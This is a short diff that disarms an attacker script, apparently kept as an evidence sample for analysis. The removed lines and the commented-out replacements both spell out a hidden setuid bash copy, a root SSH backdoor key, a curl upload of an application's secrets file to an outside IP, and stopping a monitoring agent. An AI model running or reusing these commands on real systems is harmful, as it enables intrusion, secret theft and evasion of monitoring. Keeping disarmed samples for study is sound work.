@@ -1,13 +1,12 @@
-#!/bin/bash
+# SIMULATION ONLY — DISARMED EVIDENCE SAMPLE
+# DO NOT EXECUTE. This file describes attacker actions for analysis.
+# The commands are intentionally commented out and use a documentation-only IP.
 
-cp /bin/bash /usr/local/bin/.system-shell
-chmod u+s /usr/local/bin/.system-shell
-
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." \
->> /root/.ssh/authorized_keys
-
-curl -s -X POST \
-  -d @/etc/finance-api/app.env \
-  https://45.83.64.91/upload
-
-systemctl stop azuremonitoragent
+# cp /bin/bash /usr/local/bin/.system-shell
+# chmod u+s /usr/local/bin/.system-shell
+#
+# echo "ssh-rsa [REDACTED-SYNTHETIC-PUBLIC-KEY]" >> /root/.ssh/authorized_keys
+#
+# curl -s -X POST -d @/etc/finance-api/app.env https://198.51.100.91/upload
+#
+# systemctl stop azuremonitoragent
